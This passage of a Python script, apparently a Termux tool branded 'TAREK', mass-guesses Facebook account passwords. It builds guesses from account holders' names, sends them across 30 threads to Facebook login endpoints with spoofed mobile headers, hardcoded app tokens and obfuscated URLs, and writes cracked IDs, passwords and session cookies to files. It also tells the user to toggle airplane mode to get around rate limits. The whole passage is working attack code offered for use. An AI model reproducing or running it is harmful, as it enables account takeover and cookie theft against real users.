            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https:'+'//b-api'+'.faceb'+'ook.com'+'/metho'+'d/auth.'+'login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    oks.append(ids)
                    open('/sdcard/TAREK-TOOL/TAREK-RANDM-M2-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-RANDM-M2-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                #print(f'\r\r{rad}[TAREK•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/TAREK-TOOL/TAREK-RANDM-M2-CP.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 3]▬▭▬▭▬▭▬▭#
def _method_four(ids,passlist,tl):
    global loop,oks,cps
    sys.stdout.write(f"\r{rad}[{green}TAREK-R3{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(tl))}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': RM3, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                ckkk = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', ckkk)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{uid} {red}»{green1} {pas}")
                    print(f"\r\r{red}[{green1}🍪{red}]{white} {ckkk}")
                    oks.append(ids)
                    open('/sdcard/TAREK-TOOL/TAREK-RANDM-M3-OK.txt','a').write(uid+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-RANDM-M4-COOKIES.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
            if 'checkpoint' in log_cookies:
                #print(f'\r\r{rad}[TAREK•CP•💔]{rad} {uid} {rad}» {pas}')
                #open('/sdcard/TAREK-TOOL/TAREK-RANDM-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE MENU]▬▭▬▭▬▭▬▭#
def __FILEX__():
    global oks,cps
    main_logo()
    print(f"{style} {green}EXAMPLE {rad}[{white}sdcard/tarek.txt{rad}]");linex()
    dfile = input(f'{style} {green}FILE PATH {white}▶︎ {green}')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{style}{green} FILE LOCATION NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    main_logo()
    try:
        pass_lmit = int(input(f'{style} {green}PASS LIMITS {white}▶︎ {green}'));linex()
    except:
        pass_lmit = 3
    main_logo()
    print(f"{style} {green}EXAMPLE {rad}[{white}firstlast first123{rad}]");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{style}{green} PASSWORD NO.{i+1} {white}▶︎ {green}'));linex()
    main_logo()
    print(f'{white}[{red}A{white}]{green} METHOD{Y} - {white}[{green1}M1{white}]')
    print(f'{white}[{red}B{white}] {green}METHOD{Y} - {white}[{green1}M2{white}]')
    print(f'{white}[{red}C{white}] {green}METHOD{Y} - {white}[{green1}M3{white}]')
    print(f'{white}[{red}D{white}] {green}METHOD{Y} - {white}[{green1}M4{white}]')
    print(f'{white}[{red}E{white}] {green}METHOD{Y} - {white}[{green1}M5{white}]')
    linex()
    FILE_METHOD = input(f"{style} {green}SELECT METHOD {white}▶︎ {green}")
    with ThreadPool(max_workers=30) as mr_tarek_404:
        main_logo();total_ids = str(len(dx))
        print(f'{style}{green} SIM NAME {cyan}»{white} {sim}')
        print(f'{style}{green} TOTAL IDS{cyan} »{white} {total_ids}'+f'{red} ┼{green} METHOD{cyan} »{white} {FILE_METHOD}')
        print (f"{style} {green}TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN")
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if FILE_METHOD in ["1","01","A","a"]:
                mr_tarek_404.submit(FILE_M_ONE,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["2","02","B","b"]:
                mr_tarek_404.submit(FILE_M_TWO,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["3","03","C","c"]:
                mr_tarek_404.submit(FILE_M_THREE,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["4","04","D","d"]:
                mr_tarek_404.submit(FILE_M_FOUR,ids,names,passlist,total_ids)
            elif FILE_METHOD in ["5","05","E","e"]:
                mr_tarek_404.submit(FILE_M_FIVE,ids,names,passlist,total_ids)
            else:print(f'SELECTED OPTION NOT FOUND')
    print("");linex();print(f"{style}{green} THE PROCESS HAS BEEN COMPLETED");print(f"{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}"+f'{red} ┼{green} TOTAL CP {white}▶︎ {green}{len(cps)}');linex();exit()
#▬▭▬▭▬▭▬▭[FILE METHOD 1]▬▭▬▭▬▭▬▭#
def FILE_M_ONE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-F1{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM1
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://ap"+"i.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://ap'+'i.face'+'book.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-FILE-M1-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M1-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 2]▬▭▬▭▬▭▬▭#
def FILE_M_TWO(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-F2{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM2
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-FILE-M2-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M2-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 3]▬▭▬▭▬▭▬▭#
def FILE_M_THREE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-F3{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM3
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent.encode("utf-8")}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-FILE-M3-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 4]▬▭▬▭▬▭▬▭#
def FILE_M_FOUR(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-F4{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM4
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent.encode('utf-8')}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-FILE-M4-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M4-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[FILE METHOD 5]▬▭▬▭▬▭▬▭#
def FILE_M_FIVE(ids, names, passlist, total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad}[{green}TAREK-F5{rad}]{white}»{rad}[\x1b[1;97m{loop}{rad}]{white}»{rad}[{green1}OK{white}•{green1}{len(oks)}{rad}]{white}»{rad}[\x1b[1;97m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            metheni = str(random.randint(20000000, 40000000)),
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + FM5
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
            "adid": f"{adid}",
            "device_id": f"{device_id}",
            "family_device_id": f"{family_device_id}",
            "secure_family_device_id": f"{secure_family_device_id}",
            "advertiser_id": f"{advertiser_id}",
            "method": "POST",
            "format": "json",
            "email": ids,
            "password": pas,
            "cpl": "true",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "error_detail_type": "button_with_disabled",
            "generate_machine_id": "1",
            "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
            "omit_response_on_success": "false",
            "fb_api_req_friendly_name": "authenticate"}
            headers = [
            "Host: b-graph.facebook.com",
            "Authorization: OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            f"x-fb-connection-bandwidth: {metheni}",
            f"X-FB-Net-HNI: {netheni}",
            f"X-FB-SIM-HNI: {simheni}",
            f"User-Agent: {user_agent.encode('utf-8')}",
            "x-fb-connection-quality: GOOD",
            "x-fb-connection-type: MOBILE.LTE",
            "content-type: app_authlication/x-www-form-urlencoded",
            "x-fb-http-engine: Liger",
            "x-fb-client-IP: True",
            "x-fb-server-cluster: Keep-Alive",
            "Content-Type: application/json",
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers);c.setopt(c.WRITEDATA, buffer);data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()]);c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'));c.perform();c.close();po = buffer.getvalue().decode('utf-8');q = json.loads(po)
            if 'session_key' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}TAREK{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/TAREK-TOOL/TAREK-FILE-M5-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/TAREK-TOOL/TAREK-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass
if __name__=="__main__":
    os.system('clear')
    tarek_main()
else:
    os.system('clear')
    tarek_main()